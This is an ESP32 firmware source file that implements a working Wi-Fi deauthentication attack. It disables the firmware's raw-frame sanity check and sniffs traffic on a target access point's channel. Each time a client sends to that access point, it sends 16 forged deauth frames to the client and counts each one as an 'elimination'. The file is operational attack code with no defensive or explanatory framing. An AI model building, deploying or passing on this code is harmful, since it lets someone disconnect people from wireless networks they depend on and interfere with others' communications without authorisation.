#include "deauth.h"

deauth_frame_t deauth_frame;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
    const mac_hdr_t *hdr = &packet->hdr;

    uint16_t pkt_len = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
    if (pkt_len < 0)
        return;

    if (memcmp(hdr->dest, deauth_frame.sender, 6) == 0)
    {
        memcpy(deauth_frame.station, hdr->src, 6);
        for (int i = 0; i < 16; i++)
        {
            esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
        }
        total_elimination++;
    }
    else
    {
        return;
    }

    digitalWrite(2, HIGH);
    delay(10);
    digitalWrite(2, LOW);
    delay(10);
}

void start_deauth(int network_id, uint16_t reason)
{
    is_deauth_running = true;
    sys_mode = "deauth";
    total_elimination = 0;
    deauth_frame.reason = reason;
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_channel(WiFi.channel(network_id), WIFI_SECOND_CHAN_NONE);

    memcpy(deauth_frame.access_point, WiFi.BSSID(network_id), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(network_id), 6);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth()
{
    is_deauth_running = false;
    esp_wifi_set_promiscuous(false);
}